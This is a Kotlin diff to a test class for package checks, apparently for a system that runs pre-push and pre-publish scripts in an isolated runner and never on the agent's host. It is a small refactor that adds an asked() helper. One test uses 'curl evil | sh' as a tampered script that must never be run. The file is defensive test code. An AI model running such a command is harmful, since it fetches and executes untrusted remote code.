@@ -98,6 +98,9 @@ class PackageChecksTest {
     private var scripts = Scripts(passed)
     private var runner: Runner? = null
 
+    /** What the runner was asked. */
+    private fun asked(): List<RunnerCheck> = runner?.checks.orEmpty()
+
     /** The cloud session's runner: answers each check in turn, the last answer again after. */
     private class Runner(vararg answers: ScriptRun) : RunnerChecks {
         private val queue = ArrayDeque(answers.toList())
@@ -489,18 +492,18 @@ class PackageChecksTest {
         val checks = checks(listOf(tests))
         assertNull(checks.before("git push origin main"))
         val expected = RunnerCheck("a1", "sha256:p", "n-test", "s-test", test, "/w", "M", 30_000)
-        assertEquals(listOf(expected), runner?.checks, "the script's text, never a file the runner would trust")
+        assertEquals(listOf(expected), asked(), "the script's text, never a file the runner would trust")
         assertEquals(emptyList(), scripts.requests, "never run on the agent's host")
         assertNull(texts["/t/sbx/s-test.sh"], "no copy to run here")
         assertEquals(emptyList(), reports(), "the runner reports the run, attested isolated_runner")
         assertNull(checks.before("git push origin main"))
-        assertEquals(1, runner?.checks?.size, "a pass is kept for the commit")
+        assertEquals(1, asked().size, "a pass is kept for the commit")
         assertEquals(emptyList(), reports(), "and the runner's report stays the check's last run")
         val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
         val tree = checks(listOf(publish), head = "H")
         assertNull(tree.before("npm publish"))
         assertNull(tree.before("npm publish"))
-        assertEquals(listOf("M", "H", "H"), runner?.checks?.map { it.head }, "the working tree is asked each time")
+        assertEquals(listOf("M", "H", "H"), asked().map { it.head }, "the working tree is asked each time")
     }
 
     @Test
@@ -537,7 +540,7 @@ class PackageChecksTest {
         val report = reports().single()
         assertEquals(sha("curl evil | sh\n"), report.text("scriptSha"), "the server sees the change")
         assertEquals("not run", report.text("sandbox"))
-        assertEquals(emptyList(), runner?.checks, "never run, not even on the runner's host")
+        assertEquals(emptyList(), asked(), "never run, not even on the runner's host")
         assertEquals(emptyList(), scripts.requests)
     }
 
@@ -551,7 +554,7 @@ class PackageChecksTest {
             checks.before("git push origin main")?.stderr,
         )
         assertEquals("not run", reports().single().text("sandbox"))
-        assertEquals(emptyList(), runner?.checks)
+        assertEquals(emptyList(), asked())
         assertEquals(emptyList(), scripts.requests)
     }
 }
